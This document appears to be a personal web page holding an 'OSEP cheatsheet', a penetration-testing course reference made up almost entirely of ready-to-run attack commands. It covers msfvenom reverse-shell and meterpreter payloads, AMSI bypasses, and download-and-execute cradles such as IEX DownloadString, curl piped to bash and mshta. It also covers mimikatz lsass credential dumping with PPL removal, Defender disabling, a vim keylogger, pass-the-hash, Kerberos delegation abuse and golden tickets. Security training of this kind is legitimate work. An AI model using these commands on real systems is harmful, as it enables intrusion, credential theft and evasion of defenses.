---
permalink: /osep.html
title: "OSEP cheatsheet"
---

A cheatsheet with useful commands used during my OSEP course.
- [Payloads](#payloads)
- [AMSI](#amsi)
- [Execute](#execute)
- [MSSQL](#mssql)
- [Tunneling](#tunneling)
- [PrivEsc](#privesc)
- [Traversal](#traversal)
- [Linux libraries](#linux-libraries)
- [Active Directory](#active-directory)
  - [Enum](#enum)
  - [Unconstrained delegation](#unconstrained-delegation)
  - [Constrained delegation](#constrained-delegation)
  - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
  - [Kerberoasting](#kerberoasting)
  - [Forest enum](#forest-enum)
  - [Forest compromise](#forest-compromise)
  - [Beyond forest enum](#beyond-forest-enum)
- [Enumeration](#enumeration)
- [Windows Defender](#windows-defender)
- [Other](#other)

<hr>
# Payloads
<hr>
Multi handler oneliner with custom certificate
```shell
msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_https; set HandlerSSLCert /home/kali/worstenbrood.pem; set lhost 192.168.49.92; set lport 443; run'
```

EXE
```shell
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=444 -f exe -o /var/www/html/shell.exe
```

VBA
```shell
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f vbapplication
```

CSharp SharpShooter payload (edit file after creation, remove first line and brackets)
```shell
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp -o /var/www/html/payload.txt
```

DLL (for rundll32)
```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f dll -o data/exploit.dll
```

Python
```shell
msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f raw -o data/shell.py
```

ELF
```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f elf -o /var/www/html/met.elf
```

DotNetToJscriptDirectly
```shell
DotNetToJScript.exe ExampleAssembly.dll --lang=VBScript --ver=v4 -o runner.vbs
```

JS through SharpShooter
```shell
python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test

python SharpShooter.py --payload js --dotnetver 2 --scfile /var/www/html/payload.txt --output test --delivery web --web http://192.168.1.1/output/test.payload --smuggle --template mcafee --shellcode
```

HTA through SharpShooter
```shell
python2 SharpShooter.py --payload hta --rawscfile ~/sharpshooter.raw --dotnetver 2  --output test --stageless
```

Domain fronting meterpreter
```shell
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=cdn.azureedge.net -f exe > http-df.exe
```

```shell
set LHOST do.skype.com
set OverrideLHOST do.skype.com
set OverrideRequestHost true
set HttpHostHeader offensive-security.azureedge.net
run -j
```

<hr>
# AMSI
<hr>
Hooking with Frida
```shell
frida-trace -p 3532 -x amsi.dll -i Amsi*
```

Bypasses
```powershell
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('ams'+'iInitFailed','NonPublic,Static').SetValue($null,$true)
```

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
```

```powershell
$ananas=[Ref].Assembly.GetTypes();Foreach($banana in $ananas) {if ($banana.Name -like "*iU"+"tils") {$cherry=$banana}};$py=$cherry.GetFields('NonPublic,Static');Foreach($ello in $py) {if ($ello.
Name -like "*Context") {$ll=$ello}};$j=$ll.GetValue($null);[IntPtr]$ptr=$j;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
```

Inject AMSI bypass remotely
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/amsi.txt') | IEX
```

PowerShell v2 (no amsi)
```powershell
powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/run.txt')"
```

WinDbg
```
lm m amsi (check if amsi module is loaded)
```

```
sxe ld amsi (breakpoint on loading of amsi module)
```

<hr>
# Execute
<hr>
Powershell one-liner (base64 payload)
```powershell
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/run.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText

powershell -enc KAB...
```

WMIC
```shell
wmic process get brief /format:"http://192.168.1.1/payload.xsl"
```

Microsoft.Workflow.Compiler
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```

Run.xml
```csharp
using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
        Console.WriteLine("I executed!");
    }
}
```

installutil
```
bitsadmin /Transfer myJob http://192.168.1.1/payload.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

rundll32
```
rundll32 test.dll,run
rundll32 shell32.dll,Control_RunDLL C:\Users\student\exploit.dll (msf payload)
```

Alternate Data stream
```
type Desktop\jscript.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test2.js
```

```
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test2.js"
```

HTA shortcut
```
C:\Windows\System32\mshta.exe http://192.168.1.1/payload.hta
```

PowerShell with error printing
```powershell
powershell -Command wget -Uri http://192.168.1.1:81/ -Method POST -Body $(powershell Invoke-WebRequest 'http://192.168.1.1/met.exe' -OutFile '%TEMP%\\met.exe')
```

Macro Shell with error printing
```
Dim str As String
str = "powershell -Command wget -Uri http://192.168.1.1:81/ -Method POST -Body $(powershell Invoke-WebRequest 'http://192.168.1.1/met.exe' -OutFile '%TEMP%\\met.exe')"
Shell str, vbHide
```

JScript shell with error printing
```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell -Command wget -Uri http://192.168.1.1:81/ -Method POST -Body $(powershell whoami)");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

Loading a driver through sc.exe
```
sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand
sc start mimidrv
```

VBS get
```
Dim o
Set o = CreateObject("MSXML2.XMLHTTP")
o.open "GET", "http://192.168.1.1/fromvbs", False
o.send
```

JS get
```
var url = "http://192.168.1.1/fromjs"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```

BAT get
```
start "" http://192.168.1.1/frombat
```

Linux rev shell bash
```shell
curl 192.168.1.1/s.sh | bash
```

<hr>
# MSSQL
<hr>
Query MSSQL servers
```
setspn -T <domain> -Q MSSQLSvc/*

. .\GetUserSPNs.ps1
```

xp_cmdshell
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'
```

xp_dirtree
```
.\SQL.exe sql.domain.com msdb "EXEC master.sys.xp_dirtree '\\192.168.1.1\file', 1, 1;"
```

sp_OACreate and sp_OAMethod
```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';
```

Exec on linked server
```sql
select * from openquery("SERVER", 'select USER_NAME()')
```

Custom assembly from file
```sql
use msdb

EXEC sp_configure 'show advanced options',1
RECONFIGURE

EXEC sp_configure 'clr enabled',1
RECONFIGURE

EXEC sp_configure 'clr strict security', 0
RECONFIGURE

CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;

CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

EXEC cmdExec 'whoami'
```

Custom assembly from hex
```sql
CREATE ASSEMBLY my_assembly FROM 0x4D7A..... WITH PERMISSION_SET = UNSAFE;
```

Load PowerUpSQL
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/PowerUpSQL.ps1') | IEX
```

Get all accessible domain MSSQL's
```
Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10
```

Enum database users
```powershell
Get-SQLFuzzServerLogin
```

Audit SQL
```powershell
Invoke-SQLAudit -Verbose
```

<hr>
# Tunneling
<hr>
DNSCAT
```
dnscat2-server tunnel.com
dnscat2-v0.07-client-win32.exe tunnel.com
listen 127.0.0.1:3389 172.16.51.21:3389
```

MSF autoroute
```shell
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set version 4a
set srvhost 127.0.0.1
exploit -j

bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'

proxychains rdesktop 192.168.1.1
```

Chisel
```
./chisel server -p 8080 --socks5 << server
ssh -N -D 0.0.0.0:1080 localhost << server (tunnel)
chisel.exe client 192.168.1.1:8080 socks << client
```
<hr>
# PrivEsc
<hr>
Load PowerUp
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.49.236/PowerUp.ps1') | IEX
Invoke-AllChecks
```

Load PrivEscCheck https://github.com/itm4n/PrivescCheck
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.49.236/PrivescCheck.ps1') | IEX
Invoke-PrivescCheck -Extended
```

Shadowcopies
```
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\domain.com\Downloads\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\domain.com\Downloads\system
```

LAPS
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/LAPSToolkit.ps1') | IEX

Get-LAPSComputers (get all computers with labs, including pw)
Find-LAPSDelegatedGroups (users that are allowed to view pws)
Get-NetGroupMember -GroupName "LAPS Password Readers"
```

MSF
```shell
use post/windows/gather/credentials/enum_laps
```

View current privs
```
whoami /priv
```

Spoolsample local exploit
```
upload C:\\Windows\\Tasks\\met.exe
impersonate.exe \\.\pipe\test\pipe\spoolss
SpoolSample.exe srv srv/pipe/test
```

Mimikatz remove PPL and dump pws
```
privilege::debug (enable priv)
!+ (load driver)
!processprotect /process:lsass.exe /remove (remove ppl protection)
sekurlsa::logonpasswords (dump pws)
```

Offline dump lsass
```
procdump.exe lsass.exe

sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Remotely load Invoke-Mimikatz
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/mimikatz.txt') | IEX
```

Invoke-Mimikatz remove PPL Protection
```powershell
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
```

Invoke-Mimikatz get passwords from minidump
```powershell
Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\tools\lsass.dmp`" sekurlsa::logonpasswords"
```

Invoke-Mimikatz remove ppl & dump passwords
```powershell
Invoke-Mimikatz -Command "privilege::debug" !+ "!processprotect /process:lsass.exe /remove" sekurlsa::logonpasswords
```

Enable wdigest
```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest  -> value "1"
```

VIM
```shell
.vimrc
~/.vim/plugin/<name>.vim
:silent !source ~/.vimrunscript
```

.bashrc
```shell
alias sudo="sudo -E"
```

View sudo current user permissions
```shell
sudo -l
```

Open shell
```shell
:shell
```

Keylogger
```shell
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

<hr>
# Traversal
<hr>
RDP
```
mstsc /admin (without disconnecting regular user)
mstsc /restrictedadmin (use current creds)
```

PTH
```
sekurlsa::pth /user:admin /domain:<domain> /ntlm:<ntlm> /run:"mstsc.exe /restrictedadmin"

sekurlsa::pth /user:admin /domain:<domain> /ntlm:<ntlm> /run:powershell
Enter-PSSession -Computer <hostname>

xfreerdp /u:admin /pth:<ntlm> /v:192.168.1.1 /cert-ignore
```

SharpRDP
```
SharpRDP.exe computername=srv command=notepad username=domain\willem password=lab
sharprdp.exe computername=srv command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=domain\willem password=lab
```

Fileless PTH
```shell
python3 scshell.py domain/user@192.168.1.1 -hashes 00000000000000000000000000000000:00000000000000000000000000000000 -service-name SensorService
```

ControlMaster
```shell
ssh -S /home/user/.ssh/controlmaster/user\@linuxvictim\:22 user@linuxvictim
```

SSH-Agent
```shell
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh user@linuxvictim
```

Ansible
```shell
ansible victims -a "whoami"
ansible victims -a "whoami" --become
```

Crackmapexec

```shell
crackmapexec smb 192.168.1.1 -d domain.com -u x -p h4x -x dir

--exec-method {mmcexec,wmiexec,smbexec,atexec}
```

Powershell remoting
```shell
crackmapexec winrm -d domain.com -u Administrator -p 'pass123' -x "whoami" 192.168.1.1
```

Pass the hash
```shell
crackmapexec smb 192.168.1.1 -d domain.com -u admin -H 11111111111111111111111111 -X dir
```

Use keytab of user
```shell
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown user:user /tmp/krb5cc_minenow
ls -al /tmp/krb5cc_minenow
kdestroy
klist
export KRB5CCNAME=/tmp/krb5cc_minenow
klist
```

Use keytab with impacket
```shell
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 DOMAIN.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 DOMAIN.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.DOMAIN.COM -k -no-pass
```

<hr>
# Linux libraries
<hr>
Compile lib LD_LIBRARY_PATH
```shell
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -o libhax.so hax.o
```

with map
```shell
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
```

Compile lib LD_PRELOAD
```shell
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o preload.c
gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
export LD_PRELOAD=/home/offsec/evil_geteuid.so
cp /etc/passwd /tmp/testpasswd
```

Add to .bashrc
```shell
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
```

View loaded libs
```shell
ldd /usr/bin/top
```

Get symbols
```shell
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

Create version map
```shell
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

<hr>
# Active Directory
<hr>
## Enum

View object ACL's
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/powerview.ps1') | IEX

Get-ObjectAcl -Identity <username>
Get-ObjectAcl -Identity <username> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}

```

View all user objects access rights (GenericAll, WriteDACL)
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

View all group objects access rights (GenericAll, WriteDACL)
```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Change ACL if WriteDACL is set on object
```powershell
Add-DomainObjectAcl -TargetIdentity <target username/group> -PrincipalIdentity <username> -Rights All
```

Get interesting ACL's
```powershell
Invoke-ACLScanner -ResolveGUIDs
```

## Unconstrained delegation

Get unconstrained delegation computers
```powershell
Get-DomainComputer -Unconstrained

-Domain domain.com (optional to enum other domains in forest)
```

View and use forwardable tickets on unconstrained host
```
privilege::debug
sekurlsa::tickets
sekurlsa::tickets /export
kerberos::ptt <filename>
C:\Tools\SysinternalsSuite\PsExec.exe \\dc01 cmd
whoami
```

Check printer spooler service active on remote host
```
dir \\dc01\pipe\spoolss
ls \\dc01\pipe\spoolss
```

Rubeus monitor for incoming tickets filtered by host (run on Unconstrained delegation host)
```
Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

Force remote host to connect to host
```
SpoolSample.exe DC01 TARGET01
```

Use ticket with Rubeus
```
Rubeus.exe ptt /ticket:<base64>
```

Force dcsync using mimikatz to get user hashes using injected ticket
```
lsadump::dcsync /domain:x.domain.com /user:x\krbtgt
lsadump::dcsync /domain:x.domain.com /user:x\administrator
```

## Constrained delegation

Get constrained delegation computers
```powershell
Get-DomainComputer -TrustedToAuth

-Domain d.com (optional to enum other domains in forest)
```

Generate a TGT for a user
```
.\Rubeus.exe asktgt /user:iissvc /domain:x.com /rc4:<hash>
```

S4U Constrained Delegation generate ticket for any domain user
```
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.domain.com:1433 /ptt
```

S4U Constrained Delegation generate ticket for any domain user for a alternative service on the same host
```
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.domain.com:1433 /altservice:CIFS /ptt
```

PowerShell Remotely load rubeus
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("purge".Split())
[Rubeus.Program]::Main("s4u /user:host$ /rc4:x /impersonateuser:administrator /msdsspn:cifs/host$ /ptt".Split())
ls \\host\c$
```

## Resource-Based Constrained Delegation

Get GenericWrite computers
```powershell
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Get machine quota in the domain
```powershell
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

Add computer using PowerMad
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/Powermad.ps1') | IEX

New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
```

Update msDS-AllowedToActOnBehalfOfOtherIdentity of 'server' object to newly created machine
```powershell
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity server | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Use computer account to generate ticket
```
.\Rubeus.exe s4u /user:myComputer$ /rc4:x /impersonateuser:administrator /msdsspn:CIFS/dc01.domain.com /ptt
```

Add computer using impacket
```
python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -k -no-pass -computer-name 'rbcd$' -computer-pass 'Password12345' -dc-ip 1.1.1.1 DOMAIN/user -dc-host dc.domain.com
```

Update msDS-AllowedToActOnBehalfOfOtherIdentity of 'server' object to newly created machine using impacket
```
python3 rbcd.py -delegate-to 'HOST$' -delegate-from 'rbcd$' -action write -k -no-pass DOMAIN/user -debug
```

Get service ticket using impacket
```
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn CIFS/HOST.DOMAIN.COM -impersonate 'Administrator' -dc-ip 1.1.1.1 'DOMAIN/rbcd$:Password12345'
```

## Kerberoasting

PowerShell load assembly Rubeus from base64
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt

$a = Get-Content .\rubeus.txt
$assem = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($a))
```

Export all available tickets
```
[Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
```

## Forest enum

Get trusted domains
```powershell
nltest /trusted_domains

([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

Get-DomainTrust -API [-Domain anotherdomaininforest.com] (WIN32)

Get-DomainTrust [-Domain anotherdomaininforest.com] (LDAP)
```

Enumerate users in a trusted domain / forest with PowerView
```powershell
Get-DomainUser -Domain domain.com
```

Enumerate groups in a trusted domain / forest with PowerView
```powershell
Get-DomainGroup -Domain domain.com
```

Get users in Enterprise Admins group of root domain
```powershell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain domain.com
```

## Forest compromise

Dump KRBTGT
```
lsadump::dcsync /domain:d.x.com /user:d\krbtgt
```

Generate domain SID
```powershell
Get-DomainSID -Domain d.x.com
```

Generate golden ticket with ExtraSides (obtaining Enterprise Admins role in trusted domain) <non-existing user> <origin domain> <origin domain SID> <krbtgt> <destination domain SID with "-519" appended>
```
kerberos::golden /user:h4x /domain:domain.com /sid:S-1-5x /krbtgt:x /sids:S-1-5-21-x-519 /ptt
```

## Beyond forest enum

Get forest trusts
```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

Get-ForestTrust
```

Get trusts to domains in other forest
```powershell
Get-DomainTrust -Domain d.com

Get-DomainTrustMapping
```

Get users in other forest
```powershell
Get-DomainUser -Domain d.com
```

Get group members of a group in another forest
```powershell
Get-DomainForeignGroupMember -Domain d.com
```

Enable SID history (on target forest DC)
```
netdom trust d2.com /d:d1.com /enablesidhistory:yes
```
<hr>
# Enumeration
<hr>
Enumerate Windows with HostRecon
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/HostRecon.ps1') | IEX

Invoke-HostRecon
```

Check if PPL Protection is enabled
```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

Check if AppLocker is enabled
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

Check PowerShell execution context
```powershell
$ExecutionContext.SessionState.LanguageMode
```

Get loaded DLL's
```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

<hr>
# Windows Defender
<hr>
Disable defender realtime montoring
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Defender get detection history
```powershell
Get-MpThreatDetection
```

Defender remove signatures
```powershell
MpCmdRun.exe -RemoveDefinitions -All
```

Defender settings
```powershell
Get-MpPreferences
```

<hr>
# Other
<hr>
View current Integrity
```
whoami /groups
```

Rubeus Password to hash
```
.\Rubeus.exe hash /password:lab
```

Run CMD as other usr
```
runas /user:administrator@d.com cmd
```

Nmap through Proxychains
```
proxychains nmap -sT -Pn 192.168.1.1
```

Get NTLM from krb5.keytab file
```
./keytabextract.py krb5.keytab
```

Search fileshares
```powershell
Invoke-ShareFinder -Verbose -Domain d
Find-DomainShare -CheckShareAccess
```

Find machines current user has local admin
```powershell
Find-LocalAdminAccess
```

View local admins on computer
```powershell
Find-GPOComputerAdmin –Computername <ComputerName>
```

List GPO's
```powershell
Get-NetGPO
```

Reset user PW through PowerView
```powershell
Set-DomainUserPassword -Identity User -Verbose
```

Send mail with swaks
```shell
swaks --to w@domain.com --server 192.168.1.1 --body "Hello" --header "Subject: Issues"  --from hacker@domain.com
```

PowerSharpPack
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
```
